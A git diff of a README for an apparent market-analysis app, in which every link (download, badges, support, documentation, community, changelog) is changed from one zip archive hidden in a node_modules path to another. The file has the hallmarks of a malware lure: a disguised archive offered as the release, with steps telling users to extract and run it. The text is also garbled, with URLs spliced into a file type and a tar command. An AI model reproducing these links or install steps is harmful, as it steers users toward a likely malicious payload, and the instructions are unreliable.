@@ -1,8 +1,8 @@
 # 🧠 ai-market - Analyze Market Trends Easily
 
-[![Download](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip%https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)  
-[![Version](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)
-[![Status](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)](http://localhost:8001/status)
+[![Download](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip%https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)  
+[![Version](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
+[![Status](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](http://localhost:8001/status)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The AI Market Analysis System helps you track market trends and make informed de
 
 ## 📥 Download & Install
 
-To get started with the AI Market Analysis System, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip).
+To get started with the AI Market Analysis System, visit this page to download: [Download Latest Release](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip).
 
 Once you reach the downloads page, look for the latest version. Click on the file that matches your operating system. 
 
@@ -33,11 +33,11 @@ For macOS, you will typically download a `.dmg` file. Here’s what you should d
 
 ### Linux Users
 
-For Linux users, you will likely download a `https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip` file. Follow these steps:
+For Linux users, you will likely download a `https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip` file. Follow these steps:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command: `tar -xvzf ai-market*https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip` to extract the contents.
+3. Use the command: `tar -xvzf ai-market*https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip` to extract the contents.
 4. Navigate into the extracted folder and use `./ai-market` to start the application.
 
 ## 💡 System Requirements
@@ -90,25 +90,25 @@ If you encounter issues:
 - **Accessing Data**: Check your internet connection.
 - **Performance Issues**: Close any unnecessary applications to free up resources.
 
-If you still face challenges, visit our [support page](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip) for assistance.
+If you still face challenges, visit our [support page](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip) for assistance.
 
 ## 📣 Community and Support
 
 Join our community to share insights, ask questions, and contribute. You can find us at:
 
-- **GitHub Discussions**: [Join Here](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)
+- **GitHub Discussions**: [Join Here](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
 - **Twitter**: Follow us for updates.
 
 For any bug reports or feature requests, please raise an issue directly on the GitHub page.
 
 ## 📅 Changelog
 
-To keep track of updates, check the [https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip) file for the latest changes and improvements.
+To keep track of updates, check the [https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip) file for the latest changes and improvements.
 
 ## 🚀 Quick Links
 
-- [Download Latest Release](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)
-- [Our Documentation](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)
-- [Support Page](https://raw.githubusercontent.com/vieta123456/ai-market/master/frontend/node_modules/date-fns/esm/locale/ar-DZ/_lib/match/ai-market_1.1.zip)
+- [Download Latest Release](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
+- [Our Documentation](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
+- [Support Page](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
 
 Thank you for choosing the AI Market Analysis System. Happy analyzing!
